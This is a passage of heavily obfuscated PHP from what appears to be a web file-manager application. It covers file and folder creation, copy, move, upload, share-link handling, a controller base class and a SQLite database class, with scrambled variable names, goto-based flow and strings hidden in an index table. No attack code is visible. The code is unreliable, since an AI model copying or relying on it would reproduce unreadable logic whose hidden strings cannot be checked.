mkfile($aí·Û¡ÌÂÛ, $CÛÎà‹ÆšÁ = '', $E¦Åö‚«ÖØ = REPEAT_RENAME) { $cÇòš¥†òÒ =& $_SERVER[›èö’ù¤]; $bÃ‘„¢Ï½¾ = $this->parse($aí·Û¡ÌÂÛ); $aí·Û¡ÌÂÛ = $bÃ‘„¢Ï½¾[$cÇòš¥†òÒ[395]]; for ($FÒÀì¦µ½Ï = 0; $FÒÀì¦µ½Ï < count($bÃ‘„¢Ï½¾[$cÇòš¥†òÒ[1231]]); $FÒÀì¦µ½Ï++) { $aÊ–ïÄ¬¤› = $bÃ‘„¢Ï½¾[$cÇòš¥†òÒ[1231]][$FÒÀì¦µ½Ï]; if ($FÒÀì¦µ½Ï == count($bÃ‘„¢Ï½¾[$cÇòš¥†òÒ[1231]]) - 1) { $aí·Û¡ÌÂÛ = $this->model->mkfile($aí·Û¡ÌÂÛ, $aÊ–ïÄ¬¤›, $CÛÎà‹ÆšÁ, $E¦Åö‚«ÖØ); break; } $aí·Û¡ÌÂÛ = $this->model->mkdir($aí·Û¡ÌÂÛ, $aÊ–ïÄ¬¤›, REPEAT_SKIP); } return $this->getPathOuter($aí·Û¡ÌÂÛ); } public function mkdir($d·Œ­’ï, $f˜ØÙöÙ†É = REPEAT_SKIP) { $cùí°¨Øø =& $_SERVER[›èö’ù¤]; $f½ƒ®‹†‡ˆ = $this->parse($d·Œ­’ï); $d·Œ­’ï = $f½ƒ®‹†‡ˆ[$cùí°¨Øø[395]]; for ($fÔ°ŸòÛñ = 0; $fÔ°ŸòÛñ < count($f½ƒ®‹†‡ˆ[$cùí°¨Øø[1231]]); $fÔ°ŸòÛñ++) { $E¬øóÎ…áÊ = $f½ƒ®‹†‡ˆ[$cùí°¨Øø[1231]][$fÔ°ŸòÛñ]; $d·Œ­’ï = $this->model->mkdir($d·Œ­’ï, $E¬øóÎ…áÊ, $f˜ØÙöÙ†É); } return $this->getPathOuter($d·Œ­’ï); } public function copyFile($dùß”ÔÊë™, $DàÁÚÆ·»Ú, $DââÖ˜ŞÉ = REPEAT_REPLACE) { $C† —ã·¸£ =& $_SERVER[›èö’ù¤]; $C ¸™×© = $this->parse($DàÁÚÆ·»Ú); $CçÒô÷ƒ = $this->model->copy($dùß”ÔÊë™, $C ¸™×©[$C† —ã·¸£[395]], $DââÖ˜ŞÉ, $C ¸™×©[$C† —ã·¸£[76]]); return $CçÒô÷ƒ ? $this->getPathOuter($CçÒô÷ƒ) : !1; } public function moveFile($b·Ä™Ú¹†, $C¬µ¯èÂƒÇ, $BŠ°Àµ ¢å = REPEAT_REPLACE) { $d¿†„†ã¤ê =& $_SERVER[›èö’ù¤]; $D«Å¤»£Òè = $this->parse($C¬µ¯èÂƒÇ); $D‹á­‡¼– = $this->model->move($b·Ä™Ú¹†, $D«Å¤»£Òè[$d¿†„†ã¤ê[395]], $BŠ°Àµ ¢å, $D«Å¤»£Òè[$d¿†„†ã¤ê[76]]); return $D‹á­‡¼– ? $this->getPathOuter($D‹á­‡¼–) : !1; } public function copy($F¨ùí…ôÓ, $fÓ†âĞºğ´, $BÌ›¦‚‰Šø = REPEAT_REPLACE) { $fâùˆÛÎÇõ = $this->parse($fÓ†âĞºğ´); $AèÜƒ‰³®† = $this->model->copy($F¨ùí…ôÓ, $fâùˆÛÎÇõ[$_SERVER[›èö’ù¤][395]], $BÌ›¦‚‰Šø); return $AèÜƒ‰³®† ? $this->getPathOuter($AèÜƒ‰³®†) : !1; } public function moveSameAllow() { } public function move($Eá›ŞŞîñ«, $c¯²êËù®®, $EêˆİÂôô³ = REPEAT_REPLACE) { $F¸É„®çß¤ = $this->parse($c¯²êËù®®); $e™‘ö’Ø™ = $this->model->move($Eá›ŞŞîñ«, $F¸É„®çß¤[$_SERVER[›èö’ù¤][395]], $EêˆİÂôô³); return $e™‘ö’Ø™ ? $this->getPathOuter($e™‘ö’Ø™) : !1; } public function remove($Añğªæâ’ƒ, $DÎ¹ÎÙ˜è¥ = true) { return $this->model->remove($Añğªæâ’ƒ, $DÎ¹ÎÙ˜è¥); } public function rename($a¹«Æâ¡Ö¹, $fÙ…ƒ›”ï¾) { $d•Úìçòâã = $this->model->rename($a¹«Æâ¡Ö¹, $fÙ…ƒ›”ï¾); return $d•Úìçòâã ? $this->getPathOuter($a¹«Æâ¡Ö¹) : $d•Úìçòâã; } public function size($e˜ÀŸ˜‡) { $e“®Åğ—Ùù = $this->infoSimple($e˜ÀŸ˜‡); return $e“®Åğ—Ùù ? $e“®Åğ—Ùù[$_SERVER[›èö’ù¤][78]] : 0; } public function infoSimple($cÎ¬±¶ö‡) { return $this->model->sourceInfo($cÎ¬±¶ö‡); } public function info($C’ùÛºÄ”™) { return $this->infoParse($C’ùÛºÄ”™); } public function infoAuth($FçÑ™Ğš„) { return $this->infoParse($FçÑ™Ğš„, !1, !0); } public function infoWithChildren($d®É¦›ÚŒ) { return $this->infoParse($d®É¦›ÚŒ, !0); } protected function infoParse($F¢¢×ëÒ», $Dë‘Šİ‹ = false, $b¡•…Âªæª = false) { if (!$Dë‘Šİ‹) { return $this->model->pathInfo($F¢¢×ëÒ», $b¡•…Âªæª); } return $this->model->pathInfoMore($F¢¢×ëÒ»); } public function infoFull($a³‰èããÏ‘) { $dÉ¦„†óë =& $_SERVER[›èö’ù¤]; $eÒ¸•‘„Ü = explode($dÉ¦„†óë[8], $a³‰èããÏ‘); $F–ÀĞŸ÷ = implode($dÉ¦„†óë[8], array_splice($eÒ¸•‘„Ü, 1)); return $this->model->pathInfoByPath($eÒ¸•‘„Ü[0], $F–ÀĞŸ÷); } public function hashSimple($bä’¢¤Ú­á) { $BÎËìëÂâç =& $_SERVER[›èö’ù¤]; $CÕ³Ï³ôÎˆ = $this->infoWithChildren($bä’¢¤Ú­á); return $CÕ³Ï³ôÎˆ[$BÎËìëÂâç[164]][$BÎËìëÂâç[171]]; } public function hashMd5($DÃ¶øİƒÔ) { $b†àâ¡áèŒ =& $_SERVER[›èö’ù¤]; $c¬æ´Æ˜ÅÒ = $this->infoWithChildren($DÃ¶øİƒÔ); return $c¬æ´Æ˜ÅÒ[$b†àâ¡áèŒ[164]][$b†àâ¡áèŒ[170]]; } public function exist($a¤âñ„º–‰) { $FŸƒ¢”ô½ç =& $_SERVER[›èö’ù¤]; $BÜ¾Ù¤…« = $this->parse($a¤âñ„º–‰); if (!$BÜ¾Ù¤…«[$FŸƒ¢”ô½ç[76]]) { return $this->isFile($a¤âñ„º–‰) || $this->isFolder($a¤âñ„º–‰); } $F‰˜…é—ô = array($FŸƒ¢”ô½ç[396] => $BÜ¾Ù¤…«[$FŸƒ¢”ô½ç[395]], $FŸƒ¢”ô½ç[28] => $BÜ¾Ù¤…«[$FŸƒ¢”ô½ç[76]]); $EÅâ’İõÆá = $this->model->where($F‰˜…é—ô)->find(); return $EÅâ’İõÆá ? !0 : !1; } public function isFile($AŒ…¼†…©à) { $AÆ¢ˆçõÜË =& $_SERVER[›èö’ù¤]; $EÓ‹š÷­¨¬ = $this->infoSimple($AŒ…¼†…©à); return $EÓ‹š÷­¨¬ && $EÓ‹š÷­¨¬[$AÆ¢ˆçõÜË[405]] == $AÆ¢ˆçõÜË[87] ? !1 : !0; } public function isFolder($aï™—ò‡¿”) { $Cš½¢‹Ÿ·ù =& $_SERVER[›èö’ù¤]; $c¼‰°šÈ—‹ = $this->infoSimple($aï™—ò‡¿”); return $c¼‰°šÈ—‹ && $c¼‰°šÈ—‹[$Cš½¢‹Ÿ·ù[405]] == $Cš½¢‹Ÿ·ù[87] ? !0 : !1; } public function listPath($bÙÃêÉ¹ëö, $C¯¥ôª¯›Í = false) { $a©ò¨õ“ËÀ =& $_SERVER[›èö’ù¤]; if ($bÙÃêÉ¹ëö == $a©ò¨õ“ËÀ[33]) { return !1; } $déö¡•  = array($a©ò¨õ“ËÀ[396] => $bÙÃêÉ¹ëö); if ($C¯¥ôª¯›Í) { return $this->model->listSource($déö¡• , -1); } return $this->model->listSource($déö¡• ); } public function has($dÔè®ÄåˆÊ, $c¨ªÍ©¬ã¯ = false, $A¿ÑŒˆ£ïÖ = null) { $AÈ×¬ô›‹ï =& $_SERVER[›èö’ù¤]; $cÖƒÊƒµ‰‰ = $this->infoWithChildren($dÔè®ÄåˆÊ); if ($c¨ªÍ©¬ã¯) { return array($AÈ×¬ô›‹ï[204] => $cÖƒÊƒµ‰‰[$AÈ×¬ô›‹ï[204]], $AÈ×¬ô›‹ï[203] => $cÖƒÊƒµ‰‰[$AÈ×¬ô›‹ï[203]]); } return $A¿ÑŒˆ£ïÖ ? $cÖƒÊƒµ‰‰[$AÈ×¬ô›‹ï[204]] : $cÖƒÊƒµ‰‰[$AÈ×¬ô›‹ï[203]]; } public function listAll($bä‰ˆÉ…Œê) { $F†Àˆ²ñõ¦ = IO::info($this->pathParse[$_SERVER[›èö’ù¤][76]]); if (!$F†Àˆ²ñõ¦) { return array(); } return $this->model->listAll($bä‰ˆÉ…Œê); } public function getContent($EÉÖ«¦È) { return $this->model->getContent($EÉÖ«¦È); } public function setContent($f·ŒÆ¡ß…Ó, $c¾à¼êÖóÛ = '') { return $this->model->setContent($f·ŒÆ¡ß…Ó, $c¾à¼êÖóÛ); } public function fileSubstr($A¥°ğåŠ«Ÿ, $B½§÷©šÃ, $c™„²±¯Ö§) { return $this->model->fileSubstr($A¥°ğåŠ«Ÿ, $B½§÷©šÃ, $c™„²±¯Ö§); } public function download($e÷ªøÍØ´, $BêÏ­À‡Ó = '') { $CŞ¤¿¦¸¼ = get_path_father($BêÏ­À‡Ó); $E£éëÜàŒá = get_path_this($BêÏ­À‡Ó); $bÈö’„æ¶á = $this->model->fileInfoGet($e÷ªøÍØ´); $E«ÚõŒğé = IO::copy($bÈö’„æ¶á[$_SERVER[›èö’ù¤][76]], $CŞ¤¿¦¸¼, !1, $E£éëÜàŒá); return $E«ÚõŒğé; } public function setModifyTime($Cº’˜‚Ğ, $CéâÉÁğ‰¬ = '') { $eÑ·Û­œ³ =& $_SERVER[›èö’ù¤]; if (!$Cº’˜‚Ğ) { return; } $this->model->where(array($eÑ·Û­œ³[412] => $Cº’˜‚Ğ))->save(array($eÑ·Û­œ³[84] => $CéâÉÁğ‰¬)); } public function upload($F‹ƒ½éä„·, $b§İ«àš®, $AŸµ…µ–ºŠ = false, $e¶Èİ¨–Î† = REPEAT_REPLACE) { $d›Ä¡æÀ„¬ =& $_SERVER[›èö’ù¤]; $BÏ¥ä›÷çõ = $this->parse($F‹ƒ½éä„·); $d¼”È°ê‰Æ = $this->model->addFile($BÏ¥ä›÷çõ[$d›Ä¡æÀ„¬[395]], $b§İ«àš®, $BÏ¥ä›÷çõ[$d›Ä¡æÀ„¬[76]], $AŸµ…µ–ºŠ, $e¶Èİ¨–Î†); return $this->getPathOuter($d¼”È°ê‰Æ); } public function uploadFileByID($fĞ›°Úäç, $EÆÖÔë…Õ­, $dë—Ğ¨•´Ğ) { $BÁÖ’ïÌØ¨ =& $_SERVER[›èö’ù¤]; $aÎù±®îù = $this->parse($fĞ›°Úäç); $BßªçÑ¸Û = $this->model->addFileByFileID($aÎù±®îù[$BÁÖ’ïÌØ¨[395]], $EÆÖÔë…Õ­, $aÎù±®îù[$BÁÖ’ïÌØ¨[76]], $dë—Ğ¨•´Ğ); return $this->getPathOuter($BßªçÑ¸Û); } public function addFileByRemote($C‚•ÙÜÍƒÙ, $C¦ö‘à†·¤, $C•®Â»‡‡À = array(), $bù¤ÅùÈ¿ = '', $a”ƒ‘«œéĞ) { $aÊù¼í°· =& $_SERVER[›èö’ù¤]; $f¶£ô«Ò„´ = $this->parse($C‚•ÙÜÍƒÙ); $bù¤ÅùÈ¿ = empty($bù¤ÅùÈ¿) ? $f¶£ô«Ò„´[$aÊù¼í°·[76]] : $bù¤ÅùÈ¿; $EĞ†œò©¤ = $this->model->addFileByRemote($f¶£ô«Ò„´[$aÊù¼í°·[395]], $C¦ö‘à†·¤, $bù¤ÅùÈ¿, $C•®Â»‡‡À, $a”ƒ‘«œéĞ); return $this->getPathOuter($EĞ†œò©¤); } public function uploadLink($Aô§¬È•Ïî, $dª”¸ï¨ò’ = 0) { $fÆ‰Îå“ç¦ =& $_SERVER[›èö’ù¤]; $Cµ‹ãÒ´ = $this->parse($Aô§¬È•Ïî); $B©æÚ´í¬Ò = _get($GLOBALS[$fÆ‰Îå“ç¦[7]], $fÆ‰Îå“ç¦[1232]); $E­¶¼·êŸ± = _get($GLOBALS[$fÆ‰Îå“ç¦[7]], $fÆ‰Îå“ç¦[1233]); $Aô§¬È•Ïî = Model($fÆ‰Îå“ç¦[598])->createFileName($Cµ‹ãÒ´[$fÆ‰Îå“ç¦[76]], $B©æÚ´í¬Ò, $E­¶¼·êŸ±); return IO::uploadLink($Aô§¬È•Ïî, $dª”¸ï¨ò’); } public function fileNameAuto($E¨“Íâ…²ß, $féÊ¤ùŠ , $c«°Šß‹†“ = REPEAT_REPLACE, $FªŠïÚó’İ = false) { return $this->model->fileNameAuto($E¨“Íâ…²ß, $féÊ¤ùŠ , $c«°Šß‹†“, $FªŠïÚó’İ); } public function fileNameExist($e³ÕÔÁƒ°‡, $a‘½“˜ÌÀ‘) { return $this->model->fileNameExist($e³ÕÔÁƒ°‡, $a‘½“˜ÌÀ‘); } protected function _fileOut($C®ƒÖŠè£ˆ, $c‘‘åõ¤‡ = false, $BÛéåÅçß = false, $f¸ÇåóÇ‘å = '', $eŒø¨„Ó£õ = false) { goto a¾ï™æÌÒ†; a¾ï™æÌÒ†: $fÙÍ®ß’÷ =& $_SERVER[›èö’ù¤]; $b³öï¥îÖ = $this->model->sourceInfo($C®ƒÖŠè£ˆ); if ($b³öï¥îÖ[$fÙÍ®ß’÷[405]] == $fÙÍ®ß’÷[87]) { header($fÙÍ®ß’÷[1234]); die; } goto fÓ³›ĞÔ˜; e‡’µßƒÎÏ: if ($eŒø¨„Ó£õ) { return IO::fileOutServer($b ÂéáíÆ[$fÙÍ®ß’÷[76]], $c‘‘åõ¤‡, $F¡­¯ÜğçÄ, $f¸ÇåóÇ‘å); } IO::fileOut($b ÂéáíÆ[$fÙÍ®ß’÷[76]], $c‘‘åõ¤‡, $F¡­¯ÜğçÄ, $f¸ÇåóÇ‘å); goto F¸¸¶ÔÛÆ·; fÓ³›ĞÔ˜: $b ÂéáíÆ = $this->model->fileInfoGet($C®ƒÖŠè£ˆ); $f¸ÇåóÇ‘å = $b ÂéáíÆ[$fÙÍ®ß’÷[170]] ? $b ÂéáíÆ[$fÙÍ®ß’÷[170]] : $f¸ÇåóÇ‘å; $F¡­¯ÜğçÄ = isset($GLOBALS[$fÙÍ®ß’÷[1235]]) ? $GLOBALS[$fÙÍ®ß’÷[1235]] : $b³öï¥îÖ[$fÙÍ®ß’÷[28]]; goto e‡’µßƒÎÏ; F¸¸¶ÔÛÆ·: } public function fileOut($aµè½àìÑ­, $D¦Á‚ÒåÉÇ = false, $e¶ÀÚøÀ = false, $A¹´•ùï› = '') { $this->_fileOut($aµè½àìÑ­, $D¦Á‚ÒåÉÇ, $e¶ÀÚøÀ, $A¹´•ùï›); } public function fileOutServer($d©¨¶½¥­É, $DÜŒËÓÅ”ø = false, $DŠ§ËÉ = false, $C—öğò»î† = '') { $this->_fileOut($d©¨¶½¥­É, $DÜŒËÓÅ”ø, $DŠ§ËÉ, $C—öğò»î†, !0); } protected function _fileOutImage($F¼‹ê™Ì…°, $DÏØÕ¾Ä‘ = 250) { goto E”İµÊëŸä; Bğò¬œ­º: $dØ”ñ’õĞİ = $this->model->fileInfoGet($F¼‹ê™Ì…°); $dØ”ñ’õĞİ[$ašÅø™Ú’[28]] = $C»ªùÇØ÷á[$ašÅø™Ú’[28]]; $dØ”ñ’õĞİ[$ašÅø™Ú’[163]] = $C»ªùÇØ÷á[$ašÅø™Ú’[163]]; goto B‰ªêìœÙ˜; E”İµÊëŸä: $ašÅø™Ú’ =& $_SERVER[›èö’ù¤]; $C»ªùÇØ÷á = $this->model->pathInfo($F¼‹ê™Ì…°); if ($C»ªùÇØ÷á[$ašÅø™Ú’[405]] == $ašÅø™Ú’[87]) { show_json($ašÅø™Ú’[1236] . $F¼‹ê™Ì…°, !1); } goto Bğò¬œ­º; B‰ªêìœÙ˜: $GLOBALS[$ašÅø™Ú’[1235]] = $dØ”ñ’õĞİ[$ašÅø™Ú’[28]]; $GLOBALS[$ašÅø™Ú’[162]] = $dØ”ñ’õĞİ; IO::fileOutImage($dØ”ñ’õĞİ[$ašÅø™Ú’[76]], $DÏØÕ¾Ä‘); goto BõÎÆ„‚«‰; BõÎÆ„‚«‰: } public function fileOutImage($Aà„»ô×Ü‡, $b±ø‘“ò£¼ = 250) { $this->_fileOutImage($Aà„»ô×Ü‡, $b±ø‘“ò£¼); } public function fileOutImageServer($A¤„¹‡¬Ã×, $AÙŞÈ¬½…ò = 250) { $this->_fileOutImage($A¤„¹‡¬Ã×, $AÙŞÈ¬½…ò); } public function link($EÛº°ÆÎßŒ, $AŞ‹³š²Ù± = '') { $f°Ì¥„óñ = $this->model->fileInfoGet($EÛº°ÆÎßŒ); return IO::link($f°Ì¥„óñ[$_SERVER[›èö’ù¤][76]], $AŞ‹³š²Ù±); } protected function parse($aÑßÜ‚ãŒ“) { $f‡ˆ•ßìù• =& $_SERVER[›èö’ù¤]; if (strstr($aÑßÜ‚ãŒ“, $f‡ˆ•ßìù•[8]) === !1) { return array($f‡ˆ•ßìù•[414] => intval($aÑßÜ‚ãŒ“), $f‡ˆ•ßìù•[76] => $f‡ˆ•ßìù•[33], $f‡ˆ•ßìù•[1231] => array()); } $F—±ê¬°ìñ = explode($f‡ˆ•ßìù•[8], trim($aÑßÜ‚ãŒ“, $f‡ˆ•ßìù•[8])); if (count($F—±ê¬°ìñ) < 2) { show_tips($aÑßÜ‚ãŒ“ . $f‡ˆ•ßìù•[1237]); } return array($f‡ˆ•ßìù•[414] => intval($F—±ê¬°ìñ[0]), $f‡ˆ•ßìù•[76] => $F—±ê¬°ìñ[1], $f‡ˆ•ßìù•[1231] => array_slice($F—±ê¬°ìñ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($BŸ…†£‡êÆ) { $this->pathParse = $BŸ…†£‡êÆ; $this->model = Model($_SERVER[›èö’ù¤][1230]); } public function getPathOuter($AÃí ÓÕÙÜ) { $Bš¼Õ»ã =& $_SERVER[›èö’ù¤]; if (!$AÃí ÓÕÙÜ) { return $AÃí ÓÕÙÜ; } $d©ï¦èˆÆ = $this->parse($AÃí ÓÕÙÜ); return trim(KodIO::makeShare($this->pathParse[$Bš¼Õ»ã[395]], $d©ï¦èˆÆ[$Bš¼Õ»ã[395]]), $Bš¼Õ»ã[8]); } protected function infoParse($aéÃÖŠŞ”§, $DœÔÁÙÃ = false, $DÕö ÕŒ±« = false) { $B®µ×­ìÍ =& $_SERVER[›èö’ù¤]; $FĞóï‰´ù = $this->pathParse[$B®µ×­ìÍ[395]]; $a‚ˆ•Üİ = trim($this->pathParse[$B®µ×­ìÍ[1088]], $B®µ×­ìÍ[8]); return Action($B®µ×­ìÍ[1238])->sharePathInfo($FĞóï‰´ù, $a‚ˆ•Üİ); } public function infoFull($dÌ›¶¡áÀ) { $EÕ³ÖÏìáí =& $_SERVER[›èö’ù¤]; $f’¯¥ƒ¯Æ = explode($EÕ³ÖÏìáí[8], trim($dÌ›¶¡áÀ, $EÕ³ÖÏìáí[8])); if (count($f’¯¥ƒ¯Æ) > 1) { $fá–á‹Á»à = implode($EÕ³ÖÏìáí[8], array_splice($f’¯¥ƒ¯Æ, 1)); $bƒ¿âÂó³¶ = $this->model->pathInfoByPath($f’¯¥ƒ¯Æ[0], $fá–á‹Á»à); if (!$bƒ¿âÂó³¶) { return !1; } $this->pathParse[$EÕ³ÖÏìáí[1088]] = $bƒ¿âÂó³¶[$EÕ³ÖÏìáí[397]]; } return $this->infoParse($dÌ›¶¡áÀ); } public function listAll($Fø½§”¡äÔ) { goto e™Ëß»Å«³; e™Ëß»Å«³: $d³´©¶Úã =& $_SERVER[›èö’ù¤]; $eÓÀ‚Ù£œ = IO::info($this->pathParse[$d³´©¶Úã[76]]); if (!$eÓÀ‚Ù£œ) { return array(); } goto a„…Ì¨İº¬; a„…Ì¨İº¬: $dÔµöò¤ùƒ = $this->model->listAll($Fø½§”¡äÔ); $DÓãÚ…µÎã = Model($d³´©¶Úã[590])->getInfo($eÓÀ‚Ù£œ[$d³´©¶Úã[483]]); $Dï‚É¢Ÿ›ñ = Action($d³´©¶Úã[1238]); goto fèŸœˆ™²À; fèŸœˆ™²À: foreach ($dÔµöò¤ùƒ as &$bç“ï±Åğˆ) { check_abort(); $bç“ï±Åğˆ[$d³´©¶Úã[85]] = $Dï‚É¢Ÿ›ñ->_shareItemeParse($bç“ï±Åğˆ[$d³´©¶Úã[85]], $DÓãÚ…µÎã); } unset($bç“ï±Åğˆ); return $dÔµöò¤ùƒ; goto B…±ŞÃ½«¾; B…±ŞÃ½«¾: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($cİ‘ôÒ²¶Ö) { $this->pathParse = $cİ‘ôÒ²¶Ö; $this->model = Model($_SERVER[›èö’ù¤][1230]); } protected function infoParse($c±ƒ‹è¡Í‚, $b»ÉŒ¦™¹È = false, $EËÉö¨áÛ = false) { $aî³Ò†š®° =& $_SERVER[›èö’ù¤]; return Action($aî³Ò†š®°[1094])->sharePathInfo($this->pathParse[$aî³Ò†š®°[76]], !0); } public function listPath($E½—‘†èá„, $Fƒ‚ˆğÌí = false) { $EÀíˆÀ§©Ç =& $_SERVER[›èö’ù¤]; $FéÏ³¿Èï = parent::listPath($E½—‘†èá„, $Fƒ‚ˆğÌí); foreach ($FéÏ³¿Èï as $F×“µ Å’ğ => $eõ„´Ä‘½Ú) { if (!in_array($F×“µ Å’ğ, array($EÀíˆÀ§©Ç[74], $EÀíˆÀ§©Ç[75]))) { continue; } foreach ($eõ„´Ä‘½Ú as $fº‚”ĞäÕÕ => $d¸ìÄ¸¹Ğ¾) { $FéÏ³¿Èï[$F×“µ Å’ğ][$fº‚”ĞäÕÕ] = Action($EÀíˆÀ§©Ç[1094])->shareItemInfo($d¸ìÄ¸¹Ğ¾); } } return $FéÏ³¿Èï; } public function listAll($f×‚İ¢Ø¦§) { goto aÃ½Ò¹éŠœ; f¦´³†Şëç: return $BØÑ°Ü®ºŸ; goto f«…¼Ï©; aÃ½Ò¹éŠœ: $A·À¢ÀèÑ =& $_SERVER[›èö’ù¤]; $A‹›©¾Öƒ£ = IO::info($this->pathParse[$A·À¢ÀèÑ[76]]); if (!$A‹›©¾Öƒ£) { return array(); } goto C¿Ü•Ê™ ï; C¿Ü•Ê™ ï: $BØÑ°Ü®ºŸ = $this->model->listAll($f×‚İ¢Ø¦§); foreach ($BØÑ°Ü®ºŸ as &$bº«º”Èœ×) { $bº«º”Èœ×[$A·À¢ÀèÑ[85]] = Action($A·À¢ÀèÑ[1094])->shareItemInfo($bº«º”Èœ×[$A·À¢ÀèÑ[85]]); } unset($bº«º”Èœ×); goto f¦´³†Şëç; f«…¼Ï©: } } goto báÒç“„ùá; dùñõ¢Èó×: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto bÉ¥¯ÙÉ“; Câœ†˜ŠŞ: $this->in =& $in; $this->values[$b½§•İâŠò[6]] =& $config; $this->values[$b½§•İâŠò[7]] =& $in; goto DÆ‰¥ğ»œÚ; bÉ¥¯ÙÉ“: $b½§•İâŠò =& $_SERVER[›èö’ù¤]; global $in, $config; $this->config =& $config; goto Câœ†˜ŠŞ; DÆ‰¥ğ»œÚ: $this->tpl = TEMPLATE . MOD . $b½§•İâŠò[8]; $this->_classObjectID = mt_rand(0, 10000); goto BÕ°…ì¯¯µ; BÕ°…ì¯¯µ: } public function loadClass($Bö³æš¢’) { if (1 === func_num_args()) { $this->{$Bö³æš¢’} = new $Bö³æš¢’(); } else { $a¥ÙÁ­æğ´ = new ReflectionClass($Bö³æš¢’); $BæÂğÚ‹æÕ = func_get_args(); array_shift($BæÂğÚ‹æÕ); $this->{$Bö³æš¢’} = $a¥ÙÁ­æğ´->newInstanceArgs($BæÂğÚ‹æÕ); } return $this->{$Bö³æš¢’}; } protected function assign($AÎˆÅğ¨òÕ, $fàÏˆ×¶ã¤) { $this->values[$AÎˆÅğ¨òÕ] = $fàÏˆ×¶ã¤; } protected function display($EŒùìğ‹) { ob_end_clean(); extract($this->values); require $this->tpl . $EŒùìğ‹; } } class DbSqliteBase extends Db { public function __construct($aÁ«¬„‰ùà = '') { $e‘¿ È‚ìå =& $_SERVER[›èö’ù¤]; if (!extension_loaded($e‘¿ È‚ìå[9])) { think_exception(think_lang($e‘¿ È‚ìå[10]) . $e‘¿ È‚ìå[11]); } if (!empty($aÁ«¬„‰ùà)) { if (!isset($aÁ«¬„‰ùà[$e‘¿ È‚ìå[12]])) { $aÁ«¬„‰ùà[$e‘¿ È‚ìå[12]] = 438; } $this->config = $aÁ«¬„‰ùà; if (empty($this->config[$e‘¿ È‚ìå[13]])) { $this->config[$e‘¿ È‚ìå[13]] = array(); } } } public function connect($a Èì°Ğ»· = '', $f¸áÅ™ó¾ò = 0) { $fÈÉééÔ°Ø =& $_SERVER[›èö’ù¤]; if (!isset($this->linkID[$f¸áÅ™ó¾ò])) { goto b‹ÁÎ§¾È; b‹ÁÎ§¾È: if (empty($a Èì°Ğ»·)) { $a Èì°Ğ»· = $this->config; } $AÃäåÔóÛ» = !empty($a Èì°Ğ»·[$fÈÉééÔ°Ø[13]][$fÈÉééÔ°Ø[14]]) ? $a Èì°Ğ»·[$fÈÉééÔ°Ø[13]][$fÈÉééÔ°Ø[14]] : $this->pconnect; $Dèª›ïİÜ£ = $AÃäåÔóÛ» ? $fÈÉééÔ°Ø[15] : $fÈÉééÔ°Ø[16]; goto Dª½·¨ÃÜğ; Dª½·¨ÃÜğ: $this->linkID[$f¸áÅ™ó¾ò] = $Dèª›ïİÜ£($a Èì°Ğ»·[$fÈÉééÔ°Ø[17]], $a Èì°Ğ»·[$fÈÉééÔ°Ø[12]]); if (!$this->linkID[$f¸áÅ™ó¾ò]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Dœ¾‘ÁÍôØ; Dœ¾‘ÁÍôØ: @sqlite_busy_timeout($this->linkID[$f¸áÅ™ó¾ò], 30000); if (1 != think_config($fÈÉééÔ°Ø[18])) { unset($this->config); } goto f±°Ù˜Œ¸›; f±°Ù˜Œ¸›: } return $this->linkID[$f¸áÅ™ó¾ò]; } public function free() { $this->queryID = null; } public function query($dŸ‚Šğà¶) { goto cªß×ŠØï; e´„ğ¢ç“Ó: think_status($F¤‚¶ğ××¿[20]); $this->queryID = sqlite_query($this->_linkID, $dŸ‚Šğà¶); $this->debug(); goto DİÆèÒ—ç‹; DİÆèÒ—ç‹: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $B°á…§¼ƒ÷ = $this->getAll(); return $B°á…§¼ƒ÷; } goto eç¶Õâ‹ãÌ; c¦ÀÓĞƒàß: $this->queryStr = $dŸ‚Šğà¶; if ($this->queryID) { $this->free(); } think_action_status($F¤‚¶ğ××¿[19], 1); goto e´„ğ¢ç“Ó; cªß×ŠØï: $F¤‚¶ğ××¿ =& $_SERVER[›èö’ù¤]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c¦ÀÓĞƒàß; eç¶Õâ‹ãÌ: } public function execute($BÏ í‰‘ßã) { goto aø¡“Àò“ó; C„Ÿ»Ò¤¾: if (!1 === $dÅøÙÃ–Ò°) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto a”§ëì‘˜; aø¡“Àò“ó: $Fƒ†•±¥¼ =& $_SERVER[›èö’ù¤]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eç£á…Òï; F££œõ«Ñè: think_status($Fƒ†•±¥¼[20]); $dÅøÙÃ–Ò° = sqlite_exec($this->_linkID, $BÏ í‰‘ßã); $this->debug(); goto C„Ÿ»Ò¤¾; Eç£á…Òï: $this->queryStr = $BÏ í‰‘ßã; if ($this->queryID) { $this->free(); } think_action_status($Fƒ†•±¥¼[21], 1); goto F££œõ«Ñè; a”§ëì‘˜: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[›èö’ù¤][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CñÖÛğå¿§ = sqlite_query($this->_linkID, $_SERVER[›èö’ù¤][23]); if (!$CñÖÛğå¿§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f¦¹¡Ì‹ = sqlite_query($this->_linkID, $_SERVER[›èö’ù¤][24]); if (!$f¦¹¡Ì‹) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a›ì°‚Ö¡ = array(); if ($this->numRows > 0) { for ($cˆÁÚ½Ùëá = 0; $cˆÁÚ½Ùëá < $this->numRows; $cˆÁÚ½Ùëá++) { $a›ì°‚Ö¡[$cˆÁÚ½Ùëá] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $a›ì°‚Ö¡; } public function getFields($BÙ‰¯®ƒù ) { $CÁë¥ÛÙÊ =& $_SERVER[›èö’ù¤]; $D‹˜ÜÖ†óí = $this->query($CÁë¥ÛÙÊ[25] . $BÙ‰¯®ƒù  . $CÁë¥ÛÙÊ[26]); $CŒœ±»çšè = array(); if ($D‹˜ÜÖ†óí) { foreach ($D‹˜ÜÖ†óí as 